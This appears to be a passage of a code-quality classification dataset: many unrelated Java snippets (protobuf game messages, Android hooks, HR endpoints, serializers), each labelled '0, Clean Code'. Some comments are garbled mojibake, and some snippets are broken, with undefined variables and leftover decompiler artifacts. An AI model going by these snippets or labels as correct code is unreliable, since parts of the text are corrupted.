public static RollRogueBuffScRsp parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new RollRogueBuffScRsp(),input).checkInitialized();
}
public static RollRogueBuffScRsp parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new RollRogueBuffScRsp(),input).checkInitialized();
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.common.tree.protos.LeafNodeProto)) {
    return super.equals(obj);
  }
  org.tribuo.common.tree.protos.LeafNodeProto other=(org.tribuo.common.tree.protos.LeafNodeProto)obj;
  if (getParentIdx() != other.getParentIdx())   return false;
  if (getCurIdx() != other.getCurIdx())   return false;
  if (java.lang.Double.doubleToLongBits(getImpurity()) != java.lang.Double.doubleToLongBits(other.getImpurity()))   return false;
  if (hasOutput() != other.hasOutput())   return false;
  if (hasOutput()) {
    if (!getOutput().equals(other.getOutput()))     return false;
  }
  if (!internalGetScore().equals(other.internalGetScore()))   return false;
  if (getGeneratesProbabilities() != other.getGeneratesProbabilities())   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"@Override public FarmStageGachaInfo clone(){
  return new FarmStageGachaInfo().copyFrom(this);
}
",0,Clean Code
"private boolean isCollapseMiuiTitleApps(){
  return mPrefsMap.getStringAsInt(""various_collapse_miui_title"",0) != 0 && collapseMiuiTitleApps.contains(mPackageName);
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(worldLevel);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(wave);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(cocoonId);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(propEntityId);
  }
  return size;
}",0,Clean Code
"public LocalStackContainer(DockerImageName dockerImageName){
  super(dockerImageName);
  withCreateContainerCmdModifier(cmd -> cmd.withEntrypoint(""sh""));
  setCommand(""-c"",""while [ ! -f "" + STARTER_SCRIPT + "" ]; do sleep 0.1; done; ""+ STARTER_SCRIPT);
  withEnv(""LOCALSTACK_HOST"",""localhost.localstack.cloud"");
  withEnv(""SERVICES"",""opensearch"");
}",0,Clean Code
"/** 
 * Start preloading the widget.
 */
private boolean preloadWidget(){
  final LauncherAppWidgetProviderInfo pInfo=mInfo.info;
  if (pInfo.isCustomWidget()) {
    return false;
  }
  final Bundle options=mInfo.getDefaultSizeOptions(mLauncher);
  if (mInfo.getHandler().needsConfigure()) {
    mInfo.bindOptions=options;
    return false;
  }
  mBindWidgetRunnable=new Runnable(){
    @Override public void run(){
      mWidgetLoadingId=mLauncher.getAppWidgetHolder().allocateAppWidgetId();
      if (LOGD) {
        Log.d(TAG,""Binding widget, id: "" + mWidgetLoadingId);
      }
      if (new WidgetManagerHelper(mLauncher).bindAppWidgetIdIfAllowed(mWidgetLoadingId,pInfo,options)) {
        mHandler.post(mInflateWidgetRunnable);
      }
    }
  }
;
  mInflateWidgetRunnable=new Runnable(){
    @Override public void run(){
      if (LOGD) {
        Log.d(TAG,""Inflating widget, id: "" + mWidgetLoadingId);
      }
      if (mWidgetLoadingId == -1) {
        return;
      }
      AppWidgetHostView hostView=mLauncher.getAppWidgetHolder().createView((Context)mLauncher,mWidgetLoadingId,pInfo);
      mInfo.boundWidget=hostView;
      mWidgetLoadingId=-1;
      hostView.setVisibility(View.INVISIBLE);
      int[] unScaledSize=mLauncher.getWorkspace().estimateItemSize(mInfo);
      DragLayer.LayoutParams lp=new DragLayer.LayoutParams(unScaledSize[0],unScaledSize[1]);
      lp.x=lp.y=0;
      lp.customPosition=true;
      hostView.setLayoutParams(lp);
      if (LOGD) {
        Log.d(TAG,""Adding host view to drag layer"");
      }
      mLauncher.getDragLayer().addView(hostView);
      mView.setTag(mInfo);
    }
  }
;
  if (LOGD) {
    Log.d(TAG,""About to bind/inflate widget"");
  }
  mHandler.post(mBindWidgetRunnable);
  return true;
}",0,Clean Code
"@Override public SingleCallGraphRootTreeNode getRootNode(){
  return (SingleCallGraphRootTreeNode)getAbstractRootNode();
}
",0,Clean Code
"@Override protected Boolean computeValue(Class<?> type){
  try {
    return (boolean)IS_RECORD.invoke(type);
  }
 catch (  IllegalAccessException|InvocationTargetException e) {
    throw new RuntimeException(e);
  }
}
@Override protected RecordComponent[] computeValue(Class<?> type){
  try {
    MethodHandles.Lookup lookup=_JDKAccess._trustedLookup(type);
    Object[] components=(Object[])GET_RECORD_COMPONENTS.invoke(type);
    RecordComponent[] recordComponents=new RecordComponent[components.length];
    for (int i=0; i < components.length; i++) {
      Object component=components[i];
      Method accessor=(Method)GET_ACCESSOR.invoke(component);
      Class<?> fieldType=(Class<?>)GET_TYPE.invoke(component);
      MethodHandle handle=lookup.unreflect(accessor);
      Object getter=_JDKAccess.makeGetterFunction(lookup,handle,fieldType);
      recordComponents[i]=new RecordComponent((Class<?>)GET_DECLARING_RECORD.invoke(component),(String)GET_NAME.invoke(component),fieldType,(Type)GET_GENERIC_TYPE.invoke(component),accessor,getter);
    }
    return recordComponents;
  }
 catch (  IllegalAccessException|InvocationTargetException e) {
    throw new RuntimeException(e);
  }
}
@Override protected Tuple2<Constructor,MethodHandle> computeValue(Class<?> type){
  RecordComponent[] components=RecordUtils.getRecordComponents(type);
  if (components == null) {
    return null;
  }
  Class<?>[] paramTypes=Arrays.stream(components).map(RecordComponent::getType).toArray(Class<?>[]::new);
  Constructor constructor;
  try {
    constructor=type.getDeclaredConstructor(paramTypes);
  }
 catch (  NoSuchMethodException e) {
    throw new RuntimeException(e);
  }
  MethodHandles.Lookup lookup=_JDKAccess._trustedLookup(type);
  if (lookup != null) {
    try {
      MethodHandle handle=lookup.findConstructor(type,MethodType.methodType(void.class,paramTypes));
      return Tuple2.of(constructor,handle);
    }
 catch (    NoSuchMethodException|IllegalAccessException e) {
      return Tuple2.of(constructor,null);
    }
  }
 else {
    return Tuple2.of(constructor,null);
  }
}",0,Clean Code
"public static SceneEntityInfo parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new SceneEntityInfo(),data).checkInitialized();
}
public static SceneEntityInfo parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new SceneEntityInfo(),input).checkInitialized();
}
public static SceneEntityInfo parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new SceneEntityInfo(),input).checkInitialized();
}
",0,Clean Code
"public String getBytesReserveInfo(){
  return this.bytesReserveInfo;
}
",0,Clean Code
"@Override public void removedNode(final ZyGraphNode<? extends IViewNode<?>> removedNode){
  for (int j=0; j < getChildCount(); ++j) {
    final SelectionHistoryTreeNode leaf=(SelectionHistoryTreeNode)getChildAt(j);
    if (leaf.getNode() == removedNode) {
      ((DefaultTreeModel)getTree().getModel()).removeNodeFromParent(leaf);
      leaf.removeFromParent();
      setUserObject(new SelectionHistoryTreeNodeWrapper(snapshot,snapshotCount));
      break;
    }
  }
}",0,Clean Code
"@Bean public TitanEmbeddingBedrockApi titanEmbeddingApi(){
  return new TitanEmbeddingBedrockApi(TitanEmbeddingModel.TITAN_EMBED_IMAGE_V1.id(),EnvironmentVariableCredentialsProvider.create(),Region.US_EAST_1.id(),new ObjectMapper(),Duration.ofMinutes(2));
}",0,Clean Code
"@Override public void writeTo(ProtoSink output) throws IOException {
  output.writeRawBytes(data);
}
",0,Clean Code
"void setSelected(boolean selected);
",0,Clean Code
"@Override public void init(){
  mPackageManagerService=findClassIfExists(""com.android.server.pm.PackageManagerService"");
  findAndHookMethod(mPackageManagerService,""systemReady"",new MethodHook(){
    @Override protected void after(    MethodHookParam param) throws Throwable {
      Context mContext=(Context)XposedHelpers.getObjectField(param.thisObject,""mContext"");
      Handler mHandler=(Handler)XposedHelpers.getObjectField(param.thisObject,""mHandler"");
      new PrefsChangeObserver(mContext,mHandler,""prefs_key_system_framework_clean_share_apps""){
        @Override public void onChange(        String name){
          mPrefsMap.put(name,PrefsUtils.getSharedStringSetPrefs(mContext,name));
        }
      }
;
    }
  }
);
  MethodHook hook=new MethodHook(){
    @Override @SuppressWarnings(""unchecked"") protected void after(    MethodHookParam param) throws Throwable {
      try {
        if (param.args[0] == null)         return;
        Intent origIntent=(Intent)param.args[0];
        String action=origIntent.getAction();
        if (action == null)         return;
        if (!action.equals(Intent.ACTION_SEND) && !action.equals(Intent.ACTION_SENDTO) && !action.equals(Intent.ACTION_SEND_MULTIPLE))         return;
        Intent intent=(Intent)origIntent.clone();
        if (intent.getDataString() != null && intent.getDataString().contains("":""))         return;
        if (intent.hasExtra(""HyperCeiler"") && intent.getBooleanExtra(""HyperCeiler"",false))         return;
        Set<String> selectedApps=mPrefsMap.getStringSet(""system_framework_clean_share_apps"");
        List<ResolveInfo> resolved=(List<ResolveInfo>)param.getResult();
        ResolveInfo resolveInfo;
        Context mContext=(Context)XposedHelpers.getObjectField(param.thisObject,""mContext"");
        PackageManager pm=mContext.getPackageManager();
        Iterator<ResolveInfo> itr=resolved.iterator();
        while (itr.hasNext()) {
          resolveInfo=itr.next();
          boolean removeOriginal=selectedApps.contains(resolveInfo.activityInfo.packageName) || selectedApps.contains(resolveInfo.activityInfo.packageName + ""|0"");
          boolean removeDual=selectedApps.contains(resolveInfo.activityInfo.packageName + ""|999"");
          boolean hasDual=false;
          try {
            hasDual=XposedHelpers.callMethod(pm,""getPackageInfoAsUser"",resolveInfo.activityInfo.packageName,0,999) != null;
          }
 catch (          Throwable ignore) {
          }
          if ((removeOriginal && !hasDual) || removeOriginal && hasDual && removeDual)           itr.remove();
        }
        param.setResult(resolved);
      }
 catch (      Throwable t) {
        if (!(t instanceof BadParcelableException))         logE(TAG,CleanShareMenu.this.lpparam.packageName,t);
      }
    }
  }
;
  String ActQueryService=isMoreAndroidVersion(33) ? ""com.android.server.pm.ComputerEngine"" : ""com.android.server.pm.PackageManagerService$ComputerEngine"";
  hookAllMethods(ActQueryService,lpparam.classLoader,""queryIntentActivitiesInternal"",hook);
}",0,Clean Code
"public RedisMetadataDAO(JedisProxy jedisProxy,ObjectMapper objectMapper,ConductorProperties conductorProperties,RedisProperties properties){
  super(jedisProxy,objectMapper,conductorProperties,properties);
  refreshTaskDefs();
  long cacheRefreshTime=properties.getTaskDefCacheRefreshInterval().getSeconds();
  Executors.newSingleThreadScheduledExecutor().scheduleWithFixedDelay(this::refreshTaskDefs,cacheRefreshTime,cacheRefreshTime,TimeUnit.SECONDS);
}
",0,Clean Code
"/** 
 * Build the input streams consisting of all-zero input streams and non-zero input streams. When reading from the non-zero input streams, the data is actually read from the original input stream. The size of each input stream is introduced by the sparse headers. NOTE : Some all-zero input streams and non-zero input streams have the size of 0. We DO NOT store the 0 size input streams because they are meaningless.
 */
private void buildSparseInputStreams() throws IOException {
  currentSparseInputStreamIndex=-1;
  sparseInputStreams=new ArrayList<>();
  final List<TarArchiveStructSparse> sparseHeaders=currEntry.getSparseHeaders();
  if (sparseHeaders != null && sparseHeaders.size() > 1) {
    final Comparator<TarArchiveStructSparse> sparseHeaderComparator=(p,q) -> {
      final Long pOffset=p.getOffset();
      final Long qOffset=q.getOffset();
      return pOffset.compareTo(qOffset);
    }
;
    Collections.sort(sparseHeaders,sparseHeaderComparator);
  }
  if (sparseHeaders != null) {
    final InputStream zeroInputStream=new TarArchiveSparseZeroInputStream();
    long offset=0;
    for (    final TarArchiveStructSparse sparseHeader : sparseHeaders) {
      if (sparseHeader.getOffset() == 0 && sparseHeader.getNumbytes() == 0) {
        break;
      }
      if ((sparseHeader.getOffset() - offset) < 0) {
        throw new IOException(""Corrupted struct sparse detected"");
      }
      if ((sparseHeader.getOffset() - offset) > 0) {
        sparseInputStreams.add(new BoundedInputStream(zeroInputStream,sparseHeader.getOffset() - offset));
      }
      if (sparseHeader.getNumbytes() > 0) {
        sparseInputStreams.add(new BoundedInputStream(inputStream,sparseHeader.getNumbytes()));
      }
      offset=sparseHeader.getOffset() + sparseHeader.getNumbytes();
    }
  }
  if (!sparseInputStreams.isEmpty()) {
    currentSparseInputStreamIndex=0;
  }
}",0,Clean Code
"@TruffleBoundary public final boolean startsWith(VmCollection other){
  if (getLength() < other.getLength())   return false;
  var iter=iterator();
  var otherIter=other.iterator();
  while (otherIter.hasNext()) {
    if (!iter.next().equals(otherIter.next()))     return false;
  }
  return true;
}
",0,Clean Code
"Role getRole();
",0,Clean Code
"public GroupNotifyUser getUser1(){
  return this.user1;
}",0,Clean Code
"/** 
 * Update data source connection
 * @param param
 * @return
 */
DataResult<Long> updateWithPermission(DataSourceUpdateParam param);
",0,Clean Code
"/** 
 * 灏嗗璞¤浆鎹负 {@linkplain Category}鍒楄〃銆� <p> 鏀寔鏍煎紡濡備笅锛� </p> <p> <code>""...""</code> </p> <p> <code>{ ... }</code> </p> <p> <code>[ { ... }, ..., ""..."", ... ]</code> </p>
 * @param obj
 * @return
 */
protected List<Category> convertToCategories(Object obj){
  List<Category> categories=new ArrayList<Category>(1);
  convertToCategories(categories,obj);
  return categories;
}
protected void convertToCategories(List<Category> categories,Object obj){
  if (obj == null)   return;
 else   if (obj instanceof Category)   categories.add((Category)obj);
 else   if (obj instanceof String) {
    Category category=createCategory();
    category.setName((String)obj);
    categories.add(category);
  }
 else   if (obj instanceof Map<?,?>) {
    @SuppressWarnings(""unchecked"") Map<String,?> map=(Map<String,?>)obj;
    String name=(String)map.get(Category.PROPERTY_NAME);
    if (name == null)     return;
    Category category=createCategory();
    category.setName(name);
    category.setNameLabel(convertToLabel(map.get(Category.PROPERTY_NAME_LABEL)));
    category.setDescLabel(convertToLabel(map.get(Category.PROPERTY_DESC_LABEL)));
    category.setOrder(convertToInt(map.get(Category.PROPERTY_ORDER),category.getOrder()));
    categories.add(category);
  }
 else   if (obj instanceof Collection<?>) {
    Collection<?> collection=(Collection<?>)obj;
    for (    Object ele : collection)     convertToCategories(categories,ele);
  }
 else   if (obj instanceof Object[]) {
    Object[] array=(Object[])obj;
    for (    Object ele : array)     convertToCategories(categories,ele);
  }
 else   throw new UnsupportedOperationException(""Convert object of type ["" + obj.getClass().getName() + ""] to [""+ Category.class.getName()+ ""] is not supported"");
}",0,Clean Code
"/** 
 * <code>optional double defence = 3;</code>
 * @return this
 */
public AvatarProperty clearDefence(){
  bitField0_&=~0x00000004;
  defence=0D;
  return this;
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(dMJLJNDFOGP);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(kHBDIKDDIIB);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=(1 * rogueMiracleList.length()) + ProtoSink.computeRepeatedMessageSizeNoTag(rogueMiracleList);
  }
  return size;
}",0,Clean Code
"private static String parseAccessDesc(int access){
  if (access == 0) {
    return """";
  }
  StringBuilder r=new StringBuilder();
  if (TypeUtil.isPublic(access)) {
    r.append(""public "");
  }
 else   if (TypeUtil.isProtected(access)) {
    r.append(""protected "");
  }
 else   if (TypeUtil.isPrivate(access)) {
    r.append(""private "");
  }
  if (TypeUtil.isStatic(access)) {
    r.append(""static "");
  }
  if (TypeUtil.isFinal(access)) {
    r.append(""final "");
  }
  if (TypeUtil.isNative(access)) {
    r.append(""native "");
  }
  return r.toString();
}",0,Clean Code
"public String getWinRate(){
  return this.winRate;
}
",0,Clean Code
"@Override public String toString(){
  return ""Embedding {"" + "" vector = "" + Arrays.toString(vector) + "" }"";
}
",0,Clean Code
"/** 
 * 瑙ｆ瀽琛ㄨ揪寮忓弬鏁�
 * @param expression
 * @return
 */
public static Set<String> parseArgs(String expression,String regex){
  Set<String> args=new HashSet<>();
  if (StrUtil.isNotEmpty(expression)) {
    Pattern pattern=Pattern.compile(regex);
    Matcher matcher=pattern.matcher(expression);
    while (matcher.find()) {
      args.add(matcher.group(0));
    }
  }
  return args;
}",0,Clean Code
"@Override public String toString(){
  return toHexString();
}
",0,Clean Code
"int getSlideOutDistance(){
  int distance;
  if (mOrientation == VERTICAL) {
    distance=-getHeight();
    if (getChildCount() > 0) {
      int top=getChildAt(0).getTop();
      if (top < 0) {
        distance=distance + top;
      }
    }
  }
 else {
    if ((mFlag & PF_REVERSE_FLOW_PRIMARY) != 0) {
      distance=getWidth();
      if (getChildCount() > 0) {
        int start=getChildAt(0).getRight();
        if (start > distance) {
          distance=start;
        }
      }
    }
 else {
      distance=-getWidth();
      if (getChildCount() > 0) {
        int start=getChildAt(0).getLeft();
        if (start < 0) {
          distance=distance + start;
        }
      }
    }
  }
  return distance;
}",0,Clean Code
"@Override public LlamaChatResponse chatCompletion(LlamaChatRequest request){
  return this.internalInvocation(request,LlamaChatResponse.class);
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code GetGachaCeilingCsReq}
 */
public static GetGachaCeilingCsReq newInstance(){
  return new GetGachaCeilingCsReq();
}
",0,Clean Code
"public Builder withStream(boolean stream){
  this.stream=stream;
  return this;
}
",0,Clean Code
"@Override public ChallengeInfo clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  storyInfo.clearQuick();
  return this;
}",0,Clean Code
"/** 
 * 鑾峰彇妯″潡鐨勯樁娈典换鍔�
 * @param moduleId
 * @param version
 * @return
 */
List<StageTask> getByModuleIdAndVersion(Long moduleId,Integer version);
",0,Clean Code
"@PostMapping(""/addEmployee"") @ApiOperation(""鏂板缓鍛樺伐"") @OperateLog(apply=ApplyEnum.HRM,object=OperateObjectEnum.HRM_EMPLOYEE,behavior=BehaviorEnum.SAVE) public Result addEmployee(@Valid @RequestBody AddEmployeeBO employeeVO){
  List<OperationLog> operationLogList=employeeService.add(employeeVO);
  return OperationResult.ok(operationLogList);
}
@PostMapping(""/addEmployeeField"") @ApiOperation(""鏂板缓鑷畾涔夊瓧娈靛憳宸�"") @OperateLog(apply=ApplyEnum.HRM,object=OperateObjectEnum.HRM_EMPLOYEE,behavior=BehaviorEnum.SAVE) public Result addEmployee(@RequestBody AddEmployeeFieldManageBO addEmployeeFieldManageBO){
  List<OperationLog> operationLogList=employeeService.addEmployeeField(addEmployeeFieldManageBO);
  return OperationResult.ok(operationLogList);
}
",0,Clean Code
"public String getJoinGuildSig(){
  return this.mInfo.getJoinGuildSig();
}
",0,Clean Code
"/** 
 * <code>optional bool ACEOIOACIJO = 11;</code>
 * @return the aCEOIOACIJO
 */
public boolean getACEOIOACIJO(){
  return aCEOIOACIJO;
}",0,Clean Code
"/** 
 * Changes the player's current active avatar
 * @param slot The slot of the avatar we are changing to
 * @return true on success
 */
public boolean changeLeader(int slot){
  PlayerLineup lineup=this.getCurrentLineup();
  if (slot >= 0 && slot < lineup.size()) {
    lineup.setLeader(slot);
    return true;
  }
  return false;
}",0,Clean Code
"public RawCall getMatchedCall(){
  return matchedPartnerCall;
}
",0,Clean Code
"public void write(MemoryBuffer buffer,OffsetDateTime obj){
  LocalDateSerializer.writeLocalDate(buffer,obj.toLocalDate());
  LocalTimeSerializer.writeLocalTime(buffer,obj.toLocalTime());
  ZoneOffsetSerializer.writeZoneOffset(buffer,obj.getOffset());
}
",0,Clean Code
"public static int getPollutedPosition(TabbyVariable var){
  if (var != null) {
    String related=null;
    if (var.isPolluted()) {
      related=var.getValue().getRelatedType();
      if (related == null) {
        for (        TabbyVariable element : var.getElements().values()) {
          if (element != null && element.isPolluted()) {
            related=element.getValue().getRelatedType();
            break;
          }
        }
      }
      if (related == null) {
        for (        TabbyVariable field : var.getFieldMap().values()) {
          if (field != null && field.isPolluted()) {
            related=field.getValue().getRelatedType();
            break;
          }
        }
      }
    }
 else     if (var.containsPollutedVar(new ArrayList<>())) {
      related=var.getFirstPollutedVarRelatedType();
    }
    if (related != null) {
      return PositionUtils.getPosition(related);
    }
  }
  return PositionUtils.NOT_POLLUTED_POSITION;
}
",0,Clean Code
"void onWindowSizeChanged(int size);
private void onWindowSizeChanged(){
  int size=sizeNotifierLayout.getHeight();
  if (!keyboardVisible) {
    size-=emojiPadding;
  }
  if (delegate != null) {
    delegate.onWindowSizeChanged(size);
  }
  if (topView != null) {
    if (size < AndroidUtilities.dp(72) + ActionBar.getCurrentActionBarHeight()) {
      if (allowShowTopView) {
        allowShowTopView=false;
        if (needShowTopView) {
          topView.setVisibility(GONE);
          topLineView.setVisibility(GONE);
          topLineView.setAlpha(0.0f);
          resizeForTopView(false);
          topViewEnterProgress=0f;
          topView.setTranslationY(topView.getLayoutParams().height);
        }
      }
    }
 else {
      if (!allowShowTopView) {
        allowShowTopView=true;
        if (needShowTopView) {
          topView.setVisibility(VISIBLE);
          topLineView.setVisibility(VISIBLE);
          topLineView.setAlpha(1.0f);
          resizeForTopView(true);
          topViewEnterProgress=1f;
          topView.setTranslationY(0);
        }
      }
    }
  }
}",0,Clean Code
"/** 
 * <code>optional uint32 buff_id = 12;</code>
 * @return the buffId
 */
public int getBuffId(){
  return buffId;
}",0,Clean Code
"@PostMapping(""/delete/{attendanceGroupId}"") @ApiOperation(""鍒犻櫎鑰冨嫟缁�"") @OperateLog(apply=ApplyEnum.HUMAN_RESOURCE_MANAGEMENT,type=OperateTypeEnum.SETTING,behavior=BehaviorEnum.DELETE,object=OperateObjectEnum.HUMAN_ATTENDANCE_RULE_SETTING) public Result deleteAttendanceGroup(@PathVariable(""attendanceGroupId"") Long attendanceGroupId){
  OperationLog operationLog=attendanceGroupService.deleteAttendanceGroup(attendanceGroupId);
  return OperationResult.ok(operationLog);
}
",0,Clean Code
"@Test public void stringResultShouldBeCorrectlyExtracted(){
  final JsonJqTransform jsonJqTransform=new JsonJqTransform(objectMapper);
  final WorkflowModel workflow=new WorkflowModel();
  final TaskModel task=new TaskModel();
  final Map<String,Object> taskInput=new HashMap<>();
  taskInput.put(""data"",new ArrayList<>());
  taskInput.put(""queryExpression"",""if(.data | length >0) then \""EXISTS\"" else \""CREATE\"" end"");
  task.setInputData(taskInput);
  jsonJqTransform.start(workflow,task,null);
  assertNull(task.getOutputData().get(""error""));
  assertTrue(task.getOutputData().get(""result"") instanceof String);
  String result=(String)task.getOutputData().get(""result"");
  assertEquals(""CREATE"",result);
}",0,Clean Code
"/** 
 * <code>optional uint32 roll_shop_id = 15;</code>
 * @return the rollShopId
 */
public int getRollShopId(){
  return rollShopId;
}",0,Clean Code
"/** 
 * <code>repeated .RelicAffix sub_affix_list = 4;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableSubAffixList()} if you want to modify it.
 * @return internal storage object for reading
 */
public RepeatedMessage<RelicAffixOuterClass.RelicAffix> getSubAffixList(){
  return subAffixList;
}",0,Clean Code
"/** 
 * <code>optional uint32 prop_id = 4;</code>
 * @return the propId
 */
public int getPropId(){
  return propId;
}",0,Clean Code
"@Override public int getId(){
  return (GroupID << 16) + StarCount;
}",0,Clean Code
"/** 
 * <code>repeated .Shop shop_list = 8;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedMessage<ShopOuterClass.Shop> getMutableShopList(){
  bitField0_|=0x00000004;
  return shopList;
}",0,Clean Code
"@Override public String getSessionId(){
  return null;
}
",0,Clean Code
"@Test public void testZrevrangeByLex(){
  jedisCluster.zrevrangeByLex(""key"",""max"",""min"");
  jedisCluster.zrevrangeByLex(""key"",""max"",""min"",1337,1338);
}",0,Clean Code
"@Override public RelicArchive mergeFrom(final RelicArchive other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasRelicId()) {
    setRelicId(other.relicId);
  }
  if (other.hasSlot()) {
    setSlot(other.slot);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@762201ef!org.eclipse.jdt.core.dom.MethodDeclaration@152fd45",0,Clean Code
"public Integer getDimensions(){
  return this.dimensions;
}
",0,Clean Code
"@PostMapping(""/adminAddEmployee"") @ApiOperation(""浠庣郴缁熺敤鎴锋坊鍔犲憳宸�"") @OperateLog(apply=ApplyEnum.HRM,object=OperateObjectEnum.HRM_EMPLOYEE,behavior=BehaviorEnum.SAVE) public Result adminAddEmployee(@RequestBody List<AddEmployeeBO> employeeList){
  List<OperationLog> operationLogs=employeeService.adminAddEmployee(employeeList);
  return OperationResult.ok(operationLogs);
}
",0,Clean Code
"/** 
 * <code>repeated uint32 text_join_id_list = 3;</code>
 * @param value the textJoinIdList to add
 * @return this
 */
public TextJoinQueryCsReq addTextJoinIdList(final int value){
  bitField0_|=0x00000001;
  textJoinIdList.add(value);
  return this;
}",0,Clean Code
"public int getSizeOfUnmatchedFunctions(final ESide side){
  return metadata.getSizeOfUnmatchedFunctions(side);
}
",0,Clean Code
"@Override public List<HrmEmployee> queryBecomeEmpListByTime(LocalDate time,Collection<Long> employeeIds){
  return employeeMapper.queryBecomeEmpListByTime(time,employeeIds);
}
",0,Clean Code
"MockLVQPackedVectors(LocallyAdaptiveVectorQuantization lvq,List<VectorFloat<?>> vectors,Path testDirectory) throws IOException {
  var ravv=new ListRandomAccessVectorValues(vectors,lvq.globalMean.length());
  var encodedVectors=lvq.encodeAll(ravv);
  var lvqPath=testDirectory.resolve(""lvq"" + System.nanoTime());
  try (var out=TestUtil.openDataOutputStream(lvqPath)){
    for (    var encodedVector : encodedVectors) {
      encodedVector.writePacked(out);
    }
  }
   var dimension=lvq.globalMean.length();
  this.reader=new SimpleMappedReader(lvqPath);
  this.encodedVectorSize=2 * Float.BYTES + ((dimension % 64 == 0) ? dimension : ((dimension / 64 + 1) * 64));
  this.packedVector=vectorTypeSupport.createByteSequence(encodedVectorSize - 2 * Float.BYTES);
}",0,Clean Code
"@TruffleBoundary public final VmCollection flatten(){
  var builder=builder();
  for (  var elem : this) {
    if (elem instanceof Iterable<?>) {
      builder.addAll(iterable);
    }
 else     if (elem instanceof VmListing) {
      listing.forceAndIterateMemberValues((key,member,value) -> {
        builder.add(value);
        return true;
      }
);
    }
 else {
      CompilerDirectives.transferToInterpreter();
      throw new VmExceptionBuilder().evalError(""cannotFlattenCollectionWithNonCollectionElement"").withProgramValue(""Element"",elem).build();
    }
  }
  return builder.build();
}
",0,Clean Code
"@Override public void actionPerformed(final ActionEvent unused){
  dialog.setVisible(false);
  dialog.dispose();
}
",0,Clean Code
"public Builder withIndex(String index){
  Assert.hasText(index,""index must have a value"");
  this.index=index;
  return this;
}
",0,Clean Code
"public void removeListener(){
  graph.getView().getCanvasComponent().removeMouseListener(this);
}
",0,Clean Code
"public static void throwBy(boolean expression,String code,String msg){
  if (expression) {
    if (StrUtil.isBlank(msg)) {
      msg="""";
    }
    throw new XzException(code,msg);
  }
}
",0,Clean Code
"/** 
 * collector use - to get the next set of priority metric group tasks
 * @param metrics Current Metrics
 * @param first   Is it the first time to get
 * @return Metrics TasksReturning null means: the job has been completed, and the collection of all metrics has ended Returning the empty set metrics that there are still metrics collection tasks at the current level that have not been completed,and the next level metrics task collection cannot be performed. The set returned empty means that there are still indicator collection tasks unfinished at the current level, and the task collection at the next level cannot be carried out Returns a set of data representation: get the next set of priority index collcet tasks
 */
public synchronized Set<Metrics> getNextCollectMetrics(Metrics metrics,boolean first){
  if (priorMetrics == null || priorMetrics.isEmpty()) {
    return null;
  }
  Set<Metrics> metricsSet=priorMetrics.peek();
  if (first) {
    if (metricsSet.isEmpty()) {
      log.error(""metrics must has one [availability] metrics at least."");
    }
    return metricsSet;
  }
  if (metrics == null) {
    log.error(""metrics can not null when not first get"");
    return null;
  }
  if (!metricsSet.remove(metrics)) {
    log.warn(""Job {} appId {} app {} metrics {} remove empty error in priorMetrics."",id,monitorId,app,metrics.getName());
  }
  if (metricsSet.isEmpty()) {
    priorMetrics.poll();
    if (priorMetrics.isEmpty()) {
      return null;
    }
    Set<Metrics> source=priorMetrics.peek();
    return new HashSet<>(source);
  }
 else {
    return Collections.emptySet();
  }
}
",0,Clean Code
"public static String getUser(HttpServletRequest request){
  if (request == null) {
    return null;
  }
  return getUser(request.getHeader(API_ACCESS_KEY),request.getHeader(API_SIGNATURE));
}
public static String getUser(String accessKey,String signature){
  if (StringUtils.isBlank(accessKey) || StringUtils.isBlank(signature)) {
    return null;
  }
  UserKey userKey=CommonBeanFactory.getBean(UserKeyService.class).getUserKey(accessKey);
  if (userKey == null) {
    throw new RuntimeException(""invalid accessKey"");
  }
  if (BooleanUtils.isFalse(userKey.getEnable())) {
    throw new RuntimeException(""accessKey is disabled"");
  }
  if (BooleanUtils.isFalse(userKey.getForever())) {
    if (userKey.getExpireTime() == null || userKey.getExpireTime() < System.currentTimeMillis()) {
      throw new RuntimeException(""accessKey is expired"");
    }
  }
  String signatureDecrypt;
  try {
    signatureDecrypt=CodingUtils.aesDecrypt(signature,userKey.getSecretKey(),accessKey);
  }
 catch (  Throwable t) {
    throw new RuntimeException(""invalid signature"");
  }
  String[] signatureArray=StringUtils.split(StringUtils.trimToNull(signatureDecrypt),""|"");
  if (signatureArray.length < 2) {
    throw new RuntimeException(""invalid signature"");
  }
  if (!StringUtils.equals(accessKey,signatureArray[0])) {
    throw new RuntimeException(""invalid signature"");
  }
  long signatureTime;
  try {
    signatureTime=Long.parseLong(signatureArray[signatureArray.length - 1]);
  }
 catch (  Exception e) {
    throw new RuntimeException(e);
  }
  if (Math.abs(System.currentTimeMillis() - signatureTime) > 1800000) {
    throw new RuntimeException(""expired signature"");
  }
  return userKey.getCreateUser();
